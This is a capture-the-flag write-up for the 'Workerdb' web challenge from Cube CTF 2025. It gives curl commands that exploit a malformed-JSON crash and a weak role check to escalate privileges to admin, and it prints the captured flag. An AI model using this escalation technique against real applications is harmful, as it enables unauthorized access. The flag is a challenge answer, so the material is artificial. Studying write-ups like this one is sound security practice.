# CTF Writeup: Workerdb

**Author:** Mohamed Armaoui - C4spr0x1A

## Challenge Details
| Category       | Web Exploitation |
|----------------|------------------|
| Challenge Name | Workerdb         |
| CTF Event      | Cube CTF 2025    |
| Flag           | `cube{putt1ng_1n_th3_h0urs_pays_0ff_31530cdc}` |

## Solution

This writeup details my approach to solving the "Workerdb" CTF challenge, which involved exploiting a series of business logic vulnerabilities in an e-commerce application.

### TL;DR

A flawed settings/update endpoint zeroes any attribute I sent, then in its second pass threw an exception on malformed JSON, leaving my role as null. Because null != "user", the permission-check in `/api/manage/permissions` let me promote myself to admin, and then I could retrieve the flag from `/api/admin`.

### 1. Recon

1.  Review the code (`app.py`): endpoints:
    *   `/api/register`, `/api/login`
    *   `/api/settings/update` (wipes and reassigns attributes)
    *   `/api/manage/permissions` (checks `role != 'user'`)
    *   `/api/admin` (returns flag if `role == 'admin'`)

2.  Key observations:
    *   `update_settings`:
        ```python
        for key in new_attrs:
            if key in current_attrs:
                temp_attrs[key] = None  # first write
        ...
        for key, value in new_attrs.items():  # second pass
            if key in ALLOWED_ATTRIBUTES:
                if not has_xss(value):
                    sanitized_attrs[key] = value
        ...
        final_attrs['role'] = 'user'  # forces role back, but only if new_attrs is dict
        ```
    *   If `new_attrs` is not a dict (e.g. a JSON list), `new_attrs.items()` raises `AttributeError` after the first write.
    *   Manage endpoint checks if `current_user_attrs.get('role') != 'user'`: to allow role changes.

### 2. Register & Login

```bash
curl -s -X POST http://workerdb.chal.cubectf.com:5500/api/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"hacker","password":"letmein"}'

curl -si -X POST http://workerdb.chal.cubectf.com:5500/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"hacker","password":"letmein"}' \
  --cookie-jar cookies.txt
```

This yielded a session cookie identifying my `user_id` and `role: "user"`.

### 3. Nullifying the `role`

I sent a JSON *array* instead of an object to `/api/settings/update`:

```bash
curl -si -X POST http://workerdb.chal.cubectf.com:5500/api/settings/update \
  -H 'Content-Type: application/json' \
  -b cookies.txt \
  -d '["role"]'
```

*   First pass (inside the transaction) set `role = NULL` in the DB.
*   `db.commit()` happened here.
*   Second pass tried `new_attrs.items()`, crashed with `AttributeError` (list has no `.items()`).
*   Flask returned 500, but my role remained `NULL` in the DB.

I could verify this via the UI or by pulling `/` and inspecting the role row (it disappeared or showed blank).

### 4. Permission Escalation

With `role == NULL` (which is not equal to 'user'), the manage-permissions check passed:

```bash
curl -s -X POST http://workerdb.chal.cubectf.com:5500/api/manage/permissions \
  -H 'Content-Type: application/json' \
  -b cookies.txt \
  -d '{"target_user":"hacker","new_role":"admin"}'
```

Response:

`{"message":"Permissions updated successfully"}`

This wrote my `attributes.role = "admin"` in the database.

### 5. Retrieving the Flag

Finally, I accessed the admin endpoint:

```bash
curl -s http://workerdb.chal.cubectf.com:5500/api/admin -b cookies.txt
```

Response:

```json
{
  "message": "Welcome to the admin panel",
  "flag": "cube{putt1ng_1n_th3_h0urs_pays_0ff_31530cdc}"
}
```

—or— I could visit in my browser:

`http://workerdb.chal.cubectf.com:5500/admin`

### 6. Lessons Learned

*   Don’t trust JSON types: unvalidated shapes can break logic.
*   Exception handling matters: uncaught errors left me in a halfway state.
*   Role-check pitfalls: `NULL != 'user'` allowed bypass.